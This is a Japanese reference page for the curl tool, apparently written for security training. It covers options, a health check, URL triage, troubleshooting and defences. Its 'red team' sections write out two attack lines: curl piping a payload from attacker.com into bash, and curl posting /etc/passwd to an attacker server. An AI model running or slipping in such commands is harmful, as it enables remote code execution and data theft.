# `curl` - URLを使ったデータ転送ツール

## 概要

`curl` (Client for URL) は、さまざまなプロトコル（HTTP, HTTPS, FTP, SCPなど）を使って、サーバとの間でデータを送受信するための非常に強力で多機能なコマンドラインツールです。単にWebページやファイルをダウンロードするだけでなく、HTTPリクエストのメソッド（GET, POSTなど）やヘッダーを自由に指定できるため、Web APIのテストやデバッグ、スクリプトによる自動化など、あらゆる場面で利用されます。「コマンドライン版Webブラウザ」とも言える存在です。

(出自: `curl` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| **`wget`** | `wget` はファイルのダウンロードに特化しています。`curl` はAPIとの対話やヘッダー操作など、より汎用的なデータ転送を得意とします。 | `wget` (ダウンロード) / `curl` (API対話) |
| **HTTPie (`http`)** | `curl` のモダンな代替ツールで、APIとの対話に最適化されています。JSONの自動整形や色付けが特徴です。`curl` はほぼ全てのシステムにプリインストールされている普遍性が強みです。 | `http` (対話的APIテスト) |

## よく連携されるコマンド

`curl` の出力はデフォルトで標準出力に送られるため、パイプ (`|`) を使って他のコマンドに渡す連携が非常に強力です。

### シナリオ例: ダウンロードしたスクリプトを直接実行する (レッドチーム視点)

* **目的**: 標的サーバにディスクへの書き込み（痕跡）を最小限に抑えつつ、リモートからペイロードを実行させる。
* **連携コマンド**: `bash`
* **解説**: `curl` でダウンロードしたスクリプトの内容を、パイプ (`|`) を通じて直接 `bash` の標準入力に渡して実行させます。これは「Fileless Execution」の一形態です。
* **コマンド例**:

    ```bash
    # 攻撃者のサーバからペイロードをダウンロードし、即座にbashで実行
    curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **リクエスト制御** | |
| ⭐ `-X <METHOD>` | `GET` (デフォルト), `POST`, `PUT`, `DELETE` などのHTTPメソッドを指定します。 |
| ⭐ `-H "<Header>"` | `Content-Type: application/json` のように、カスタムリクエストヘッダーを追加します。 |
| `-d "<data>"` | `POST` リクエストで送信するデータを指定します。 |
| `--data-urlencode "<data>"` | データをURLエンコードして送信します。 |
| **出力制御** | |
| ⭐ `-o <file>` | 出力を指定したファイルに保存します。 |
| ⭐ `-s`, `--silent` | プログレスメーターやエラーメッセージを非表示にします（サイレントモード）。 |
| `-O` | URLのファイル名と同じ名前でファイルを保存します。 |
| `-v`, `--verbose` | 通信の詳細な過程（リクエスト/レスポンスヘッダーなど）を表示します。デバッグに非常に便利です。 |
| `-I`, `--head` | `HEAD`リクエストを送信し、レスポンスヘッダーのみを取得します。 |
| **接続・認証** | |
| ⭐ `-L`, `--location` | 301/302リダイレクトに追従します。 |
| `-k`, `--insecure` | (危険) サーバのSSL/TLS証明書の検証をスキップします。自己署名証明書などに対して使います。 |
| `-u <user:pass>` | Basic認証のユーザー名とパスワードを指定します。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: アプリケーションのヘルスチェックを行う。
* **組み合わせ**: `curl -s -o /dev/null -w "%{http_code}" <url>`
* **解説**: `-s` で出力を抑制し、`-o /dev/null` でボディを捨て、`-w "%{http_code}"` でHTTPステータスコードのみを出力します。スクリプトによる死活監視に最適です。
* **例**:

    ```bash
    # ヘルスチェックエンドポイントを叩き、ステータスコードが200であることを確認
    STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/health)
    if [ "$STATUS_CODE" -ne 200 ]; then echo "Health check failed!"; fi
    ```

### 2. ブルーチーム視点

* **タスク**: 不審なURLのサーバ情報を安全に調査する。
* **組み合わせ**: `curl -I <suspicious_url>`
* **解説**: `-I` (`--head`) を使い、コンテンツ本体をダウンロードすることなく、対象URLのレスポンスヘッダーのみを取得します。これにより、サーバの種類 (`Server:` ヘッダ)やリダイレクト先 (`Location:` ヘッダ) などの情報を安全に収集できます。
* **例**:

    ```bash
    # 不審な短縮URLがどこにリダイレクトされるかを確認
    curl -I [https://bit.ly/xxxxxx](https://bit.ly/xxxxxx)
    ```

### 3. レッドチーム視点

* **タスク**: 機密ファイルを外部サーバに送信（データ窃取）する。
* **組み合わせ**: `curl -X POST --data-binary @<local_file> <attacker_server_url>`
* **解説**: `--data-binary` と `@` を組み合わせることで、ローカルファイルの内容をそのままPOSTデータとして送信します。
* **例**:

    ```bash
    # /etc/passwd ファイルの内容を、攻撃者のサーバにPOSTリクエストで送信する
    curl -X POST --data-binary @/etc/passwd [http://attacker.com/loot](http://attacker.com/loot)
    ```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `curl: (60) SSL certificate problem: unable to get local issuer certificate`
    * **考えられる原因**: 接続先のサーバが提示したSSL/TLS証明書が、システムの信頼する認証局(CA)によって検証できませんでした。自己署名証明書などで発生します。
    * **解決策**: 接続先が信頼できることが確実な場合に限り、`-k` または `--insecure` オプションを付けて検証をスキップします。

2. **エラーメッセージ例 2**: `curl: (7) Failed to connect to <host> port <port>: Connection refused`
    * **考えられる原因**: ネットワーク的にホストに到達できたが、指定したポートでリッスンしているサービスが存在しません。
    * **解決策**: 接続先のホスト名やポート番号が正しいか、サーバ側でファイアウォールがそのポートをブロックしていないか、サービスが正しく起動しているかを確認します。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: **`curl | bash` の危険性**。インターネットからダウンロードした信頼できないスクリプトを内容の確認なしに実行することは、極めて危険です。
* **悪用シナリオ**: 攻撃の初期段階で、標的のサーバにリバースシェルなどのペイロードをダウンロードさせ、即座に実行させてシステムを乗っ取るために使われます。

### GTFOBins / LOLBAS における利用例

* **機能**: **File Download**, **File Upload**, **Data Exfiltration**
* **解説**: `curl` は、ほぼ全てのLinuxシステムに存在する「環境寄生型バイナリ (Living Off The Land Binary)」の代表格です。攻撃者は、追加のツールをインストールすることなく、プリインストールされている `curl` を使って、ペイロードのダウンロードやデータのアップロード（窃取）を行います。
* **参照**: `https://gtfobins.github.io/gtfobins/curl/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: Egress（外部への送信）トラフィックをファイアウォールで厳格に制御し、不要なアウトバウンド通信を許可しない。
* **Detection (検知)**: `auditd` やEDRを使って、`curl` による不審なURLからのダウンロードや、予期せぬPOSTリクエストを監視する。

## 注意点・補足

* **デバッグには `-v`**: 通信がうまくいかない場合、`curl -v <URL>` を実行すると、リクエストとレスポンスのヘッダー、TLSハンドシェイクの過程など、非常に詳細な情報が得られ、問題解決の強力な手助けとなります。
